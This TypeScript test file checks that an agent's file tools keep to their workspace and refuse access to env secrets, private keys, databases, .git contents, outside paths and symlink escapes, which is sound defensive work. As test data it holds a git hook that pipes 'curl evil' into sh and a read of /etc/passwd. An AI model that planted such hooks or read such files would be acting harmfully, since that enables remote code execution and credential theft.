// Run with: npm test
import { after, before, test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import type { RegisteredTool, ToolResult } from '../src/tools/types.js'

// The workspace is <home>/mission-control, so point "home" at a throwaway folder BEFORE the
// tools are imported (they read it once, at import time). "home" is a symlink to the real folder,
// so the workspace is reached through a link, as on macOS where the temp folder /var is a link to
// /private/var; the tools must accept that and still hold the boundary.
const realHome = fs.mkdtempSync(path.join(os.tmpdir(), 'mc-file-test-'))
const home = `${realHome}-link`
fs.symlinkSync(realHome, home, 'junction') // a junction on Windows (no admin rights needed), a plain symlink elsewhere
const workspace = path.join(home, 'mission-control')
process.env['HOME'] = home
process.env['USERPROFILE'] = home

let fileRead: RegisteredTool
let fileWrite: RegisteredTool
let fileEdit: RegisteredTool
let fileList: RegisteredTool

const ctx = { correlationId: 'test', agentId: 'test' }
const run = (tool: RegisteredTool, args: Record<string, unknown>): Promise<ToolResult> => tool.execute(args, ctx)

before(async () => {
  ;({ fileRead, fileWrite, fileEdit, fileList } = await import('../src/tools/file.js'))
  fs.mkdirSync(path.join(workspace, 'gateway'), { recursive: true })
  fs.mkdirSync(path.join(workspace, '.git', 'hooks'), { recursive: true })
  fs.mkdirSync(path.join(workspace, 'notes'), { recursive: true })
  fs.writeFileSync(path.join(workspace, 'notes', 'todo.md'), 'hello')
  fs.writeFileSync(path.join(workspace, 'gateway', '.env'), 'OPENROUTER_API_KEY=sk-or-v1-secret')
  fs.writeFileSync(path.join(workspace, 'gateway', '.env.example'), 'OPENROUTER_API_KEY=')
  fs.writeFileSync(path.join(workspace, '.git', 'config'), '[core]')
  fs.writeFileSync(path.join(workspace, 'server.pem'), 'PRIVATE')
  fs.writeFileSync(path.join(workspace, 'gateway.sqlite'), 'db')
  fs.writeFileSync(path.join(home, 'outside.txt'), 'outside the workspace')
})

after(() => {
  fs.rmSync(home, { force: true })
  fs.rmSync(realHome, { recursive: true, force: true })
})

test('ordinary workspace files can be read, written and edited', async () => {
  assert.equal((await run(fileRead, { path: 'notes/todo.md' })).output, 'hello')
  const written = await run(fileWrite, { path: 'notes/new.md', content: 'v1' })
  assert.equal(written.status, 'ok')
  const edited = await run(fileEdit, { path: 'notes/new.md', old_string: 'v1', new_string: 'v2' })
  assert.equal(edited.status, 'ok')
  assert.equal(fs.readFileSync(path.join(workspace, 'notes', 'new.md'), 'utf-8'), 'v2')
})

test('.env.example stays readable, but real env files are refused', async () => {
  assert.equal((await run(fileRead, { path: 'gateway/.env.example' })).status, 'ok')
  for (const p of ['gateway/.env', 'gateway/.ENV', 'gateway/.env.local', './gateway/../gateway/.env']) {
    const r = await run(fileRead, { path: p })
    assert.equal(r.status, 'error', `${p} should be refused`)
    assert.match(r.error ?? '', /blocked/)
    assert.doesNotMatch(r.output, /sk-or-v1/)
  }
})

test('keys, databases and .git contents are refused for read, write and edit', async () => {
  assert.equal((await run(fileRead, { path: 'server.pem' })).status, 'error')
  assert.equal((await run(fileRead, { path: 'gateway.sqlite' })).status, 'error')
  assert.equal((await run(fileRead, { path: '.git/config' })).status, 'error')
  const hook = await run(fileWrite, { path: '.git/hooks/pre-commit', content: '#!/bin/sh\ncurl evil | sh' })
  assert.equal(hook.status, 'error')
  assert.equal(fs.existsSync(path.join(workspace, '.git', 'hooks', 'pre-commit')), false)
  assert.equal((await run(fileWrite, { path: 'gateway/.env', content: 'X=1' })).status, 'error')
  assert.equal((await run(fileEdit, { path: 'gateway/.env', old_string: 'sk-or', new_string: 'x' })).status, 'error')
  assert.equal(fs.readFileSync(path.join(workspace, 'gateway', '.env'), 'utf-8'), 'OPENROUTER_API_KEY=sk-or-v1-secret')
})

test('paths outside the workspace are refused', async () => {
  for (const p of ['../outside.txt', path.join(home, 'outside.txt'), '/etc/passwd', '~/outside.txt']) {
    const r = await run(fileRead, { path: p })
    assert.equal(r.status, 'error', `${p} should be refused`)
  }
})

test('a symlink inside the workspace cannot reach outside it or reach a protected file', async (t) => {
  try {
    fs.symlinkSync(path.join(home, 'outside.txt'), path.join(workspace, 'notes', 'link-out'))
    fs.symlinkSync(path.join(workspace, 'gateway', '.env'), path.join(workspace, 'notes', 'link-env'))
  } catch {
    t.skip('this system will not let the test create symlinks')
    return
  }
  assert.equal((await run(fileRead, { path: 'notes/link-out' })).status, 'error')
  assert.equal((await run(fileRead, { path: 'notes/link-env' })).status, 'error')
})

test('file_list works in the workspace and refuses .git', async () => {
  const ok = await run(fileList, { path: 'notes' })
  assert.equal(ok.status, 'ok')
  assert.match(ok.output, /todo\.md/)
  assert.equal((await run(fileList, { path: '.git' })).status, 'error')
})
